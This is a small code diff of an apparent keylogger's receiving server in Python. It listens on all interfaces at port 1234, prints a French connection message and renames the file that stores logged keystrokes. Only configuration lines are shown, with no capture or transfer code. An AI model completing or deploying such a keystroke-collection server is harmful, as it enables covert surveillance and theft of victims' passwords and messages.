@@ -3,7 +3,7 @@ import threading
 
 ip_address = '0.0.0.0'
 port_number = 1234
-keylog_file = "keylog_client.txt"
+keylog_file = "keylog.txt"
 
 def handle_connection(connection, address):
     print(f"Connexion établie avec {address}")
